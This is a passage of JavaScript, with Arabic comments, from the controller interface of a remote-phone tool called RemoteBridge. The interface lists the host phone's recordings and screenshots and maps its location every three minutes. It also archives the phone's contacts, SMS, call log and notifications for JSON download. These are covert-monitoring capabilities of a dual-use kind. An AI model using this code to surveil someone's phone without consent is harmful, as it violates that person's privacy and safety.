            grid.innerHTML = items.slice(0, 96).map((it, idx) => {
                const icon = it.kind === 'audio' ? '🎙️' : (it.kind === 'image' ? '🖼️' : '🎬');
                // B4 — تأشير الاستبعاد من التكرار: ملف متزامنه مشفراً على الخادم (sha مطابق) أو لم يرفع بعد
                const syncedSet = ((window.__recordingsSyncMap || {})[kind]);
                const isSynced = syncedSet instanceof Set && syncedSet.has(String(it.name));
                return `
                    <div class="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden mb-2">
                        <div class="h-28 bg-slate-950 flex items-center justify-center relative">
                            <div id="rb-thumb-${idx}" class="w-full h-full flex items-center justify-center text-3xl">${icon}</div>
                        </div>
                        <div class="p-2">
                            <p class="text-[11px] font-bold text-slate-200 truncate" title="${it.name}">${it.name}</p>
                            <p class="text-[10px] text-slate-500">${recFmtSize(it.size)} • <span class="ts-en">${recFmtDate(it.dateMs)}</span></p>
                            <p class="mt-0.5">${isSynced
                                ? '<span class="text-[9px] font-bold text-emerald-400">🔐 نسخة مشفرة متزامنة على الخادم ✓</span>'
                                : '<span class="text-[9px] text-slate-500">⏳ بانتظار الرفع المشفر</span>'}</p>
                            <div class="flex items-center gap-1.5 mt-1.5">
                                <button onclick="mpFromRec(${idx})" class="flex-1 text-[10px] font-bold bg-emerald-800/70 hover:bg-emerald-700 text-emerald-200 px-2 py-1 rounded-lg transition">▶️ تشغيل</button>
                                <button onclick="mpDriveUploadRec(${idx})" title="رفع نسخة مفكوكة التشفير إلى Google Drive عبر الربط الحي" class="text-[10px] font-bold bg-sky-800/70 hover:bg-sky-700 text-sky-200 px-2 py-1 rounded-lg transition">▲ Drive</button>
                            </div>
                        </div>
                    </div>`;
            }).join('');
            requestRecordingsThumbs(items);
        }

        const recThumbCache = {};
        // B4 — خريطة الملفات المتزامنة بالفعل مع الخادم (بلا تكرار عبر sha256) — تستخدم للتأشير في الشبكة
        async function loadRecordingsServerDedup(kind) {
            const base = serverStateApiBase();
            const hostId = appConfig.targetDeviceId || '';
            if (!base || !hostId || !kind || kind === 'location') return;
            const serverKind = kind === 'screenshot' ? 'screenshots' : kind;
            try {
                const res = await fetch(base + '/api/blob/list?device=' + encodeURIComponent(hostId) + '&kind=' + encodeURIComponent(serverKind));
                if (!res.ok) return;
                const js = await res.json();
                const names = new Set((js.items || []).map(b => String(b.name || '').replace(new RegExp('^' + serverKind + '__'), '').replace(/\.rbenc$/, '')));
                window.__recordingsSyncMap = window.__recordingsSyncMap || {};
                window.__recordingsSyncMap[kind] = names;
                if (document.getElementById('rb-rec-content')) renderRecordingsGrid();
            } catch (_) {}
        }
        function requestRecordingsThumbs(items) {
            items.slice(0, 48).forEach((it, idx) => {
                const slot = document.getElementById('rb-thumb-' + idx);
                if (!slot) return;
                if (it.kind === 'audio') { slot.innerHTML = `<span class="text-4xl">🎙️</span>`; return; }
                const cached = recThumbCache[it.name];
                if (cached && cached.startsWith('data:')) { slot.innerHTML = `<img src="${cached}" class="w-full h-full object-cover"/>`; return; }
                if (cached === 'pending') return;
                recThumbCache[it.name] = 'pending';
                sendRPCCommand('file_thumbnail', { path: it.path, kind: it.kind === 'image' ? 'image' : 'video', size: 240 }, { timeout: 12000 })
                    .then(resp => {
                        const url = resp && resp.data && resp.data.thumbnail;
                        if (url && url.startsWith('data:')) {
                            recThumbCache[it.name] = url;
                            const s = document.getElementById('rb-thumb-' + idx);
                            if (s) s.innerHTML = `<img src="${url}" class="w-full h-full object-cover"/>`;
                        }
                    })
                    .catch(() => { delete recThumbCache[it.name]; });
            });
        }

        // ——— عرض مجلد الموقع ———
        function renderLocationFolderView() {
            const grid = document.getElementById('rb-rec-content');
            if (!grid) return;
            const pts = locationPointsCache || [];
            grid.innerHTML = `
                <div class="p-1">
                    <div class="flex flex-wrap items-center gap-2 mb-2">
                        <span class="text-[11px] px-2 py-1 rounded-lg border ${locationTrackingInfo ? 'border-emerald-500/50 text-emerald-300 bg-emerald-950/60' : 'border-slate-700 text-slate-400 bg-slate-900/60'}">${locationTrackingInfo ? '📍 التتبع يعمل (نبضة كل 3 دقائق)' : 'التتبع غير منشط بعد'}</span>
                        <span class="text-[11px] px-2 py-1 rounded-lg border border-slate-700 text-slate-300 bg-slate-900/60">${pts.length} نقطة مخزنة</span>
                        <button onclick="openLocationMapView()" class="px-3 py-1.5 rounded-xl text-[11px] font-bold bg-teal-700 hover:bg-teal-600 text-teal-50 transition border border-teal-500">🗺️ عرض على الخارطة التفاعلية</button>
                        <button onclick="sendRPCCommand('locations_clear', null, {timeout: 8000}).catch(() => {}); setTimeout(() => sendRPCCommand('locations_get', null, {timeout: 8000}).catch(() => {}), 1200); " class="px-3 py-1.5 rounded-xl text-[11px] font-bold bg-rose-900/70 hover:bg-rose-800 text-rose-200 transition border border-rose-700/50">🗑️مسح السجل</button>
                    </div>
                    ${pts.length === 0 ? '<div class="text-center text-slate-500 text-xs py-6">لا نقاط بعد — سجلى تُحفظ تلقائياً كل 3 دقائق.</div>' : `
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-1.5">
                            ${pts.slice(0, 60).map(p => `
                                <div class="bg-slate-900 border border-slate-800 rounded-xl p-2 flex items-center justify-between text-[10px] font-mono text-slate-300">
                                    <span>${Number(p.lat).toFixed(5)}, ${Number(p.lng).toFixed(5)}</span>
                                    <span class="text-slate-500">${recFmtDate(p.ts)}</span>
                                </div>`).join('')}
                        </div>`}
                </div>`;
        }

        // ——— الخريطة التفاعلية (Leaflet عبر CDN) ———
        function loadLeafletAssets() {
            return new Promise((resolve, reject) => {
                if (window.L) { resolve(); return; }
                try {
                    const css = document.createElement('link');
                    css.rel = 'stylesheet';
                    css.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
                    document.head.appendChild(css);
                    const s = document.createElement('script');
                    s.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
                    s.onload = () => setTimeout(resolve, 80);
                    s.onerror = () => reject(new Error('leaflet fail'));
                    document.head.appendChild(s);
                } catch (e) { reject(e); }
            });
        }

        function locationSourcePoints() {
            if (locationSnapshotBuffer && Array.isArray(locationSnapshotBuffer.location) && locationSnapshotBuffer.location.length) {
                return locationSnapshotBuffer.location;
            }
            return locationPointsCache || [];
        }

        // ——— B6: محرك بلاطات الخريطة الحقيقية (بمنظور خرائط جوجل) ———
        // الأسبقية للمزيج الهجين (قمر صناعي + شوارع وطرق كما في خرائط جوجل)، وعند فشل التحميل
        // يتعادل تلقائياً إلى مصدر مضمون (Esri للقمر الصناعي / OSM للشوارع) مع فلتر يدوي في النافذة.
        const LOC_TILE_STYLES = [
            { id: 'hyb', label: 'قمر صناعي + شوارع (مزيج جوجل)', url: 'https://mt{s}.google.com/vt/lyrs=y&hl=ar&x={x}&y={y}&z={z}', sub: '0123', maxNative: 19, attribution: '© Google' },
            { id: 'rds', label: 'طريق سير وشوارع', url: 'https://mt{s}.google.com/vt/lyrs=m&hl=ar&x={x}&y={y}&z={z}', sub: '0123', maxNative: 19, attribution: '© Google' },
            { id: 'sat', label: 'قمر صناعي فقط (جوجل)', url: 'https://mt{s}.google.com/vt/lyrs=s&hl=ar&x={x}&y={y}&z={z}', sub: '0123', maxNative: 19, attribution: '© Google' },
            { id: 'sat2', label: 'قمر صناعي بديل (Esri)', url: 'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', sub: 'a', maxNative: 19, attribution: '© Esri', refOverlay: true },
            { id: 'osm', label: 'شوارع بديل (OSM)', url: 'https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', sub: 'abc', maxNative: 19, attribution: '© OpenStreetMap' }
        ];
        const LOC_FALLBACK_STYLE = { hyb: 'sat2', rds: 'osm', sat: 'sat2', sat2: 'osm', osm: 'rds' };
        let rbLocTiles = null;

        function rbLocStyleId() {
            try { const el = document.getElementById('rb-loc-style'); if (el && el.value) return el.value; } catch (_) {}
            try { const saved = localStorage.getItem('rb_loc_style_v1'); if (saved && LOC_TILE_STYLES.some(s => s.id === saved)) return saved; } catch (_) {}
            return 'hyb';
        }

        function rbLocCreateTiles(styleId) {
            const st = LOC_TILE_STYLES.find(s => s.id === styleId) || LOC_TILE_STYLES[0];
            const layer = window.L.tileLayer(st.url, {
                maxZoom: 20,
                maxNativeZoom: st.maxNative,
                attribution: st.attribution,
                subdomains: st.sub
            });
            layer.__style = st.id;
            // عند تجمّع أخطاء البلاطات (حجب/تعطل مصدر) → التبديل المرة الواحدة إلى مصدر بديل تلقائياً
            let errs = 0;
            layer.on('tileerror', () => {
                errs++;
                if (errs === 5 && rbLocTiles === layer) {
                    try { layer.off('tileerror'); } catch (_) {}
                    const fb = LOC_FALLBACK_STYLE[st.id] || 'osm';
                    if (fb !== st.id) {
                        try { const sel = document.getElementById('rb-loc-style'); if (sel) sel.value = fb; } catch (_) {}
                        applyLocTileStyle(fb);
                        showToast('تعذر تحميل بلاطات الخريطة الأصلية — تم التبديل تلقائياً إلى: ' + ((LOC_TILE_STYLES.find(s => s.id === fb) || {}).label || 'بديل'), 'info');
                    }
                }
            });
            if (st.refOverlay) {
                // طبقة أسماء/حدود فوق صور القمر الصناعي (للمصدر البديل Esri)
                layer.__ref = window.L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Reference/World_Boundaries_and_Places/MapServer/tile/{z}/{y}/{x}', {
                    maxZoom: 20, maxNativeZoom: st.maxNative, attribution: ''
                });
            }
            return layer;
        }

        function applyLocTileStyle(styleId) {
            if (!rbLocMap) return;
            try { localStorage.setItem('rb_loc_style_v1', styleId); } catch (_) {}
            try {
                if (rbLocTiles) {
                    if (rbLocTiles.__ref) { try { rbLocMap.removeLayer(rbLocTiles.__ref); } catch (_) {} }
                    rbLocMap.removeLayer(rbLocTiles);
                }
            } catch (_) {}
            rbLocTiles = rbLocCreateTiles(styleId);
            rbLocTiles.addTo(rbLocMap);
            if (rbLocTiles.__ref) rbLocTiles.__ref.addTo(rbLocMap);
        }

        function syncLocTiles() {
            const style = rbLocStyleId();
            if (rbLocTiles && rbLocTiles.__style === style) return;
            applyLocTileStyle(style);
        }

        function syncLocStyleSelect() {
            try {
                const sel = document.getElementById('rb-loc-style');
                if (!sel || sel.__filled) { if (sel) sel.value = rbLocStyleId(); return; }
                sel.innerHTML = LOC_TILE_STYLES.map(s => `<option value="${s.id}" ${s.id === rbLocStyleId() ? 'selected' : ''}>${s.label}</option>`).join('');
                sel.__filled = true;
            } catch (_) {}
        }

        function onLocStyleChange() {
            try { applyLocTileStyle(rbLocStyleId()); } catch (_) {}
            try { rbLocMap && rbLocMap.invalidateSize && rbLocMap.invalidateSize(); } catch (_) {}
        }

        function openLocationMapView(snapshotData) {
            ensureStreamModalsShell();
            if (snapshotData) locationSnapshotBuffer = snapshotData;
            const el = document.getElementById('rb-location-modal');
            el.innerHTML = `
                <div class="bg-slate-900 border border-slate-700 rounded-2xl w-full max-w-4xl shadow-2xl p-3">
                    <div class="flex items-center justify-between mb-2 gap-2">
                        <h3 class="text-sm font-bold text-teal-300">🗺️ مسار مواقع الهاتف المضيف</h3>
                        <div class="flex items-center gap-1.5">
                            <!-- B6 — منظور الخريطة: قمر صناعي + شوارع (مزيج خرائط جوجل) أو طريق/شوارع أو بديل -->
                            <select id="rb-loc-style" onchange="onLocStyleChange()" class="bg-slate-800 border border-slate-600 rounded-xl px-2 py-1.5 text-[11px] text-slate-100">
                            </select>
                            <select id="rb-loc-window" onchange="redrawLocationMap()" class="bg-slate-800 border border-slate-600 rounded-xl px-2 py-1.5 text-[11px] text-slate-100">
                                <option value="5">آخر 5 دقائق</option>
                                <option value="10">آخر 10 دقائق</option>
                                <option value="60" selected>آخر ساعة</option>
                                <option value="120">آخر ساعتين</option>
                                <option value="all">كل السجل</option>
                            </select>
                            <button onclick="refreshLocationPoints()" class="px-2.5 py-1.5 rounded-xl text-[11px] font-bold bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700"> ⟳ </button>
                            <button onclick="closeLocationMapModal()" class="text-slate-400 hover:text-white text-lg px-2">✕</button>
                        </div>
                    </div>
                    <div id="rb-loc-map" class="w-full rounded-xl border border-slate-700" style="height: 62vh; background: #0f172a;"></div>
                    <div id="rb-loc-summary" class="text-[10px] text-slate-500 mt-1.5 font-mono"></div>
                </div>`;
            el.classList.replace('hidden', 'flex');
            syncLocStyleSelect(); // B6 — تعبئة قائمة منظور الخريطة (قمر صناعي/شوارع/بديل)
            refreshLocationPoints();
        }

        function refreshLocationPoints() {
            const targetId = activeTargetDeviceId || appConfig.targetDeviceId;
            const useRpc = targetId && isP2pAlive();
            if (useRpc) {
                locationSnapshotBuffer = null;
                sendRPCCommand('locations_get', { limit: 400 }, { timeout: 10000 }).catch(() => {
                    loadServerSnapshotLocation();
                });
            } else {
                loadServerSnapshotLocation();
            }
        }

        async function loadServerSnapshotLocation() {
            // حل وسط: لقطة نقاط مخزنة على الخادم (تبقى تُعرض حتى عند انقطاع المضيف)
            try {
                const hostId = activeTargetDeviceId || appConfig.targetDeviceId;
                const base = serverStateApiBase();
                if (!hostId || !base) { redrawLocationMap(); return; }
                const res = await fetch(base + '/api/state?deviceId=' + encodeURIComponent(hostId));
                if (!res.ok) { redrawLocationMap(); return; }
                const snap = await res.json();
                if (snap && snap.data) locationSnapshotBuffer = snap.data;
            } catch (_) {}
            redrawLocationMap();
        }

        function redrawLocationMap() {
            const mapEl = document.getElementById('rb-loc-map');
            if (!mapEl) return;
            loadLeafletAssets().then(() => {
                if (!rbLocMap || !rbLocMap._container || !document.getElementById('rb-loc-map')) {
                    try { if (rbLocMap) rbLocMap.remove(); } catch (_) {}
                    rbLocMap = window.L.map('rb-loc-map', { zoomControl: true }).setView([24.7, 46.6], 11);
                    rbLocMarkersLayer = window.L.layerGroup().addTo(rbLocMap);
                    // B6 — بلاطات خريطة حقيقية (جوجل: قمر صناعي + شوارع و/أو طريق سير) بدل OSM الفارغ، مع بدائل تلقائية
                    applyLocTileStyle(rbLocStyleId());
                } else {
                    syncLocTiles();
                    try { setTimeout(() => rbLocMap.invalidateSize(), 60); } catch (_) {}
                }
                drawLocationMapData();
            }).catch(() => {
                mapEl.innerHTML = '<div class="flex items-center justify-center h-full text-rose-400 text-xs">تعذر تحميل مكتبة الخريطة (تتطلب إنترنت مسارها مجاني) — ستظهر النقاط نصياً: ' + escapeHtml2((locationSourcePoints() || []).slice(0, 12).map(p => Number(p.lat).toFixed(4) + ',' + Number(p.lng).toFixed(4)).join(' | ')) + '</div>';
            });
        }

        function escapeHtml2(s) {
            return String(s || '').replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
        }

        function drawLocationMapData() {
            if (!rbLocMap) return;
            const now = Date.now();
            const win = document.getElementById('rb-loc-window').value;
            const sel = { '5': 5 * 60e3, '10': 10 * 60e3, '60': 60 * 60e3, '120': 120 * 60e3 }[win];
            const all = locationSourcePoints().filter(p => p && typeof p.lat === 'number' && typeof p.lng === 'number');
            const pts = sel ? all.filter(p => (now - (Number(p.ts) || 0)) <= sel) : all;
            try { rbLocMarkersLayer.clearLayers(); } catch (_) { rbLocMarkersLayer = window.L.layerGroup().addTo(rbLocMap); }
            const summary = document.getElementById('rb-loc-summary');
            if (!pts.length) {
                if (summary) summary.innerText = 'لا نقاط ضمن النطاق الزمني المحدد — إجمالي السجل: ' + all.length + ' نقطة';
                return;
            }
            const latlngs = pts.map(p => [Number(p.lat), Number(p.lng)]).reverse(); // oldest → newest
            window.L.polyline(latlngs, { color: '#34d399', weight: 3.2, opacity: 0.85 }).addTo(rbLocMap);
            pts.forEach((p, i) => {
                const isFirst = i === pts.length - 1; // after reverse logic ends at latest — الأحدث هي التي على سلسلتها الأخيرة
                const latest = i === latlngs.length - 1;
                const marker = window.L.circleMarker([Number(p.lat), Number(p.lng)], {
                    radius: latest ? 6 : 3.4,
                    color: latest ? '#22d3ee' : '#a78bfa',
                    weight: latest ? 3 : 1.6,
                    fillOpacity: 0.85
                }).bindPopup(
                    recFmtDate(Number(p.ts) || now) + '<br>' + Number(p.lat).toFixed(5) + ', ' + Number(p.lng).toFixed(5) +
                    (p.acc !== undefined ? '<br>دقة ±' + Number(p.acc).toFixed(0) + ' م' : '') +
                    (p.provider ? '<br>' + escapeHtml2(p.provider) : '')
                );
                marker.addTo(rbLocMap);
            });
            const first = latlngs[0], last = latlngs[latlngs.length - 1];
            window.L.marker(first, { title: 'بداية المسار' }).addTo(rbLocMap).bindPopup('🚩 بداية المسار');
            window.L.marker(last, { title: 'آخر نقطة' }).addTo(rbLocMap).bindPopup('🏁 آخر موضع');
            try { rbLocMap.fitBounds(window.L.latLngBounds(latlngs).pad(0.25)); } catch (_) {}
            if (summary) summary.innerText = 'عرض ' + latlngs.length + ' نقطة ضمن النطاق (إجمالي ' + all.length + ') — نبضة كل 3 دقائق';
        }

        function closeLocationMapModal() {
            const el = document.getElementById('rb-location-modal');
            if (el) el.classList.replace('flex', 'hidden');
        }

        // ——— مزامنة الحالة الصغيرة مع خادم Render ———
        function serverStateApiBase() {
            try {
                let u = (appConfig.serverUrl || PRESETS.render || '').trim().replace(/\/+$/, '');
                if (u.endsWith('/ws')) u = u.slice(0, -3);
                if (u.startsWith('wss://')) u = 'https://' + u.slice(6);
                else if (u.startsWith('ws://')) u = 'http://' + u.slice(5);
                return u;
            } catch (_) { return ''; }
        }

        function postControllerStateOnce() {
            const base = serverStateApiBase();
            if (!base || !myDeviceId) return;
            try {
                const payload = {
                    deviceId: myDeviceId,
                    role: 'controller',
                    name: appConfig.deviceName || 'Controller',
                    data: {
                        settings: {
                            serverUrl: appConfig.serverUrl,
                            deviceName: appConfig.deviceName,
                            targetDeviceId: appConfig.targetDeviceId
                        },
                        savedHosts: [...savedHosts.values()]
                    }
                };
                fetch(base + '/api/state', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(() => {});
            } catch (_) {}
        }

        let controllerStateRestored = false;
        async function restoreControllerStateOnce() {
            if (controllerStateRestored) return;
            controllerStateRestored = true;
            const base = serverStateApiBase();
            if (!base || !myDeviceId) return;
            try {
                if (savedHosts.size > 0) return; // لدينا محفوظات محلية — لا استرجاع
                const res = await fetch(base + '/api/state?deviceId=' + encodeURIComponent(myDeviceId));
                if (!res.ok) return;
                const snap = await res.json();
                if (snap && snap.data && Array.isArray(snap.data.savedHosts) && snap.data.savedHosts.length) {
                    for (const rec of snap.data.savedHosts) {
                        if (rec && rec.deviceId) savedHosts.set(rec.deviceId, { ...rec, online: false });
                    }
                    localStorage.setItem('remotebridge_saved_hosts_v1', JSON.stringify([...savedHosts.values()]));
                    if (snap.data.settings && snap.data.settings.serverUrl && !appConfig.serverUrl) appConfig.serverUrl = snap.data.settings.serverUrl;
                    renderHostList();
                    showToast('☁️ استرجعنا أجهزتك المحفوظة من الخادم (متاحة حتى في جهاز جديد)', 'success');
                }
            } catch (_) {}
        }

        // —━━— B6: نافذة الحالة + أرشيف المتحكم المحلي + ادوات الوقت —━━—

        // B6 — صياغة الوقت المنقضي بالعربية (منذ د/س/ث/يوم)
        function fmtElapsedAr(ms) {
            try {
                ms = Math.max(0, Number(ms) || 0);
                const s = Math.floor(ms / 1000);
                const dd = Math.floor(s / 86400), hh = Math.floor((s % 86400) / 3600), mm = Math.floor((s % 3600) / 60), ss = s % 60;
                const parts = [];
                if (dd) parts.push(dd + (dd === 1 ? ' يوم' : ' أيام'));
                if (hh) parts.push(hh + (hh === 1 ? ' ساعة' : hh === 2 ? ' ساعتين' : ' ساعات'));
                if (mm && !dd) parts.push(mm + (mm === 1 ? ' دقيقة' : mm === 2 ? ' دقيقتين' : ' دقائق'));
                if (!dd && !hh && !mm && ss) parts.push(ss + (ss === 1 ? ' ثانية' : ss === 2 ? ' ثانيتين' : ss <= 10 ? ' ثواني' : ' ثانية'));
                if (!parts.length) return 'الآن';
                return 'منذ ' + parts.join(' و');
            } catch (_) { return '—'; }
        }

        // B6 — عدّاد «آخر رؤية» الحي في بطاقة الطاقة/الموقع (كل ثانية) — يتبع الجهاز المختار حالياً
        setInterval(function tickLastSeen() {
            try {
                const el = document.getElementById('dash-lastseen');
                if (!el) return; // البطاقة غير معروضة الآن
                const hostId = activeTargetDeviceId || appConfig.targetDeviceId;
                const rec = hostId ? savedHosts.get(hostId) : null;
                if (!rec || !rec.lastSeenAt) {
                    if (el.textContent !== 'بدون سجل بعد') el.textContent = 'بدون سجل بعد';
                    return;
                }
                const txt = fmtElapsedAr(Date.now() - rec.lastSeenAt);
                if (el.textContent !== txt) el.textContent = txt;
                const dn = document.getElementById('dash-lastseen-detail');
                if (dn) { const dt = recFmtDate(rec.lastSeenAt); if (dn.textContent !== dt) dn.textContent = dt; }
            } catch (_) {}
        }, 1000);

        // B6 — أرشيف المتحكم المحلي: يُملأ تلقائياً كلما وصلت قوائم من المضيف عبر الربط P2P
        // (الذي يستوفي شرط «اتصال المضيف والمتحكم بنفس الجلسة») ويبقى مخزناً بشكل استمراري
        // في ملفات المتحكم المحلية (localStorage) للتصفح لاحقاً حتى بعد انقطاع الطرفين.
        const DEVICE_ARCHIVE_KEY = "remotebridge_device_archive_v1";
        const deviceArchive = (function () {
            try {
                const arr = JSON.parse(localStorage.getItem(DEVICE_ARCHIVE_KEY) || "[]");
                const m = new Map();
                (Array.isArray(arr) ? arr : []).forEach(r => { if (r && r.deviceId) m.set(r.deviceId, r); });
                return m;
            } catch (_) { return new Map(); }
        })();
        let __archSaveT = null;
        function scheduleDeviceArchiveSave() {
            if (__archSaveT) return;
            __archSaveT = setTimeout(() => {
                __archSaveT = null;
                try {
                    // آخر 12 جهازاً — يليق بحجم localStorage وحدود المتصفح
                    localStorage.setItem(DEVICE_ARCHIVE_KEY, JSON.stringify([...deviceArchive.values()].slice(-12)));
                } catch (_) {}
            }, 2500);
        }

        // B6 — الالتقاط من ردود أوامر المضيف (يُستدعى من موزّع الردود فقط)
        function archiveDeviceCapture(cmd, data) {
            try {
                const hostId = activeTargetDeviceId || appConfig.targetDeviceId;
                if (!hostId) return;
                const rec = deviceArchive.get(hostId) || { deviceId: hostId, name: '', ts: 0, info: null, lists: {} };
                const LIST_CAP = { contacts: 300, sms: 400, calls: 400, notifications: 300, location: 900 };
                const map = { contacts_list: 'contacts', sms_list: 'sms', calls_list: 'calls', notifications_list: 'notifications', locations_get: 'location' };
                let touched = false;
                if (map[cmd] && Array.isArray(data.items)) {
                    rec.lists[map[cmd]] = { ts: Date.now(), items: data.items.slice(0, LIST_CAP[map[cmd]] || 300) };
                    touched = true;
                }
                if (cmd === 'device_info' || data.batteryLevel !== undefined || data.deviceName || data.model) {
                    rec.info = {
                        ts: Date.now(),
                        deviceName: data.deviceName || '',
                        model: data.model || '',
                        manufacturer: data.manufacturer || '',
                        androidVersion: data.androidVersion || '',
                        batteryLevel: typeof data.batteryLevel === 'number' ? data.batteryLevel : undefined,
                        isCharging: data.isCharging === true,
                        storageFreeBytes: data.storageFreeBytes,
                        storageTotalBytes: data.storageTotalBytes
                    };
                    if (data.deviceName) rec.name = data.deviceName;
                    touched = true;
                }
                if (!touched) return;
                if (!rec.name) {
                    const sr = savedHosts.get(hostId);
                    if (sr && sr.deviceName) rec.name = sr.deviceName;
                }
                rec.ts = Date.now();
                deviceArchive.set(hostId, rec);
                scheduleDeviceArchiveSave();
            } catch (_) {}
        }

        const ARCH_LIST_LABELS = {
            contacts: ['👥', 'جهات الاتصال'],
            sms: ['💬', 'الرسائل'],
            calls: ['📞', 'المكالمات'],
            notifications: ['🔔', 'الإشعارات'],
            location: ['📍', 'نقاط المواقع']
        };

        // B6 — ملخص عنصر واحد لكل نوع (يظهر في متصفح الأرشيف المحلي)
        function archItemSummary(kind, it) {
            try {
                if (!it) return '';
                if (kind === 'contacts') return (it.displayName || it.name || '') + ' — ' + (it.phoneNumber || it.phoneNumbers || '');
                if (kind === 'sms') return ((it.address || '') + ' ← ' + (it.body || '')).slice(0, 80);
                if (kind === 'calls') return (it.number || it.displayName || '') + ' • ' + (it.type || '') + ' • ' + (it.durationSec || it.duration || 0) + 'ث';
                if (kind === 'notifications') return (it.packageName || it.app || '') + ' — ' + ((it.title || '') + ' ' + (it.text || it.body || '')).slice(0, 60);
                if (kind === 'location') return Number(it.lat).toFixed(5) + ', ' + Number(it.lng).toFixed(5) + ' • ' + recFmtDate(it.ts || it.time);
                return Object.keys(it).slice(0, 3).map(k => `${k}=${String(it[k]).slice(0, 24)}`).join(' | ');
            } catch (_) { return ''; }
        }

        function downloadDeviceArchiveJson(deviceId) {
            try {
                const rec = deviceArchive.get(deviceId);
                if (!rec || !deviceId) { showToast('لا يوجد أرشيف محلي لهذا الجهاز بعد', 'warn'); return; }
                const blob = new Blob([JSON.stringify(rec, null, 2)], { type: 'application/json' });
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = `remotebridge_archive_${String(deviceId).slice(0, 18)}_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
                document.body.appendChild(a);
                a.click();
                setTimeout(() => { try { URL.revokeObjectURL(a.href); a.remove(); } catch (_) {} }, 800);
                showToast('تم حفظ نسخة الأرشيف كملف JSON في التنزيلات', 'success');
            } catch (_) { showToast('فشل تنزيل الأرشيف', 'error'); }
        }

        // B6 — متصفح أرشيف المتحكم المحلي (بيانات أُخذت أثناء جلسات اتصال الطرفين معاً)
        function renderDeviceArchivePanel(deviceId) {
            try {
                const rec = deviceArchive.get(deviceId);
                const name = (rec && rec.name) || ((savedHosts.get(deviceId) || {}).deviceName) || deviceId;
                if (!rec || (!rec.info && Object.keys(rec.lists || {}).length === 0)) {
                    mountWindowOverlay(`
                        <div class="chat-header">
                            <div>
                                <h4 class="font-bold text-slate-100 text-sm">📁 أرشيف المتحكم المحلي — ${escHtml(String(name))}</h4>
                                <p class="text-[10px] text-slate-400 mt-0.5">لا توجد بيانات محفوظة بعد</p>
                            </div>
                            <button onclick="closeWindowOverlay()" class="text-slate-400 hover:text-white px-1.5 py-1 text-sm">✕</button>
                        </div>
                        <div class="chat-body">
                            <div class="text-center text-slate-500 text-xs py-6">تُحفظ البيانات تلقائياً عندما يتبادل المضيف والمتحكم القوائم عبر الربط — ثم تصبح هنا للتصفح لاحقاً حتى بعد انقطاع الطرفين.</div>
                        </div>`);
                    return;
                }
                const info = rec.info || {};
                const listsRows = Object.keys(ARCH_LIST_LABELS).map(kind => {
                    const lt = rec.lists && rec.lists[kind];
                    if (!lt || !Array.isArray(lt.items) || !lt.items.length) return '';
                    const [icon, label] = ARCH_LIST_LABELS[kind];
                    const prev = lt.items.slice(0, 8).map(it => `
                        <div class="text-[9px] text-slate-400 bg-slate-950/50 border border-slate-800 rounded-lg px-2 py-1 truncate" style="direction:ltr">${escHtml(archItemSummary(kind, it))}</div>`).join('');
                    return `
                    <div class="rounded-xl border border-slate-800 bg-slate-900/60 p-2.5">
                        <div class="flex items-center justify-between gap-2">
                            <p class="text-[11px] font-bold text-slate-200">${icon} ${label} <span class="text-[9px] text-slate-500 font-mono">(${lt.items.length} عنصر)</span></p>
                            <span class="text-[9px] text-slate-500"><span class="ts-en">${fmtEnTime(lt.ts || 0)}</span></span>
                        </div>
                        <div class="mt-1.5 space-y-1">${prev}</div>
                    </div>`;
                }).join('') || '<div class="text-[10px] text-slate-500 text-center py-3">لم تُحفظ قوائم كاملة بعد — تُرصد القوائم تلقائياً فور اكتمال الربط مع المضيف.</div>';

                mountWindowOverlay(`
                    <div class="chat-header">
                        <div>
                            <h4 class="font-bold text-slate-100 text-sm">📁 أرشيف المتحكم المحلي — ${escHtml(String(name))}</h4>
                            <p class="text-[10px] text-slate-400 mt-0.5">حفظ تلقائي لجلسات اتصال المضيف+المتحكم — <span class="ts-en">${fmtEnTime(rec.ts || 0)}</span></p>
                        </div>
                        <div class="flex items-center gap-1.5">
                            <button onclick='downloadDeviceArchiveJson(${JSON.stringify(String(deviceId))})' class="text-[10px] font-bold bg-emerald-900/70 hover:bg-emerald-800 text-emerald-300 border border-emerald-700/50 px-2 py-1 rounded-lg">⬇️ تنزيل JSON</button>
                            <button onclick="closeWindowOverlay()" class="text-slate-400 hover:text-white px-1.5 py-1 text-sm">✕</button>
                        </div>
                    </div>
                    <div class="chat-body space-y-2">
                        ${info.ts ? `<div class="rounded-xl border border-slate-800 bg-slate-950/40 p-2.5 text-[10px] text-slate-300">
                            <b class="text-emerald-300">⚙️ آخر معلومات جهاز:</b> ${escHtml([info.model, info.manufacturer, info.androidVersion ? 'أندرويد ' + info.androidVersion : ''].filter(Boolean).join(' • ') || 'غير معروفة')}
                            ${typeof info.batteryLevel === 'number' ? ` • 🔋 ${info.batteryLevel}%${info.isCharging ? ' ⚡' : ''}` : ''}
                        </div>` : ''}
                        ${listsRows}
                    </div>`);
            } catch (_) {}
        }

        // B6 — عدّاد المنقضي داخل نافذة الحالة (يتوقف تلقائياً عند إغلاقها)
        let rbSwElapsedTimer = null;
        function rbStartStatusElapsed(lastTs) {
            if (rbSwElapsedTimer) { clearInterval(rbSwElapsedTimer); rbSwElapsedTimer = null; }
            if (!lastTs) return;
            rbSwElapsedTimer = setInterval(() => {
                const e = document.getElementById('rb-sw-elapsed');
                if (!e) { clearInterval(rbSwElapsedTimer); rbSwElapsedTimer = null; return; }
                e.innerText = fmtElapsedAr(Date.now() - lastTs);
            }, 1000);
        }

        // B6 — نافذة حالة الجهاز: تفتح من الدائرة بجوار اسم الجهاز في قائمة الأجهزة المتاحة
        // تعرض: آخر رؤية + المنقضي الحي + بطارية/عدّادات من ملقطة الخادم، وتتصفح بيانات
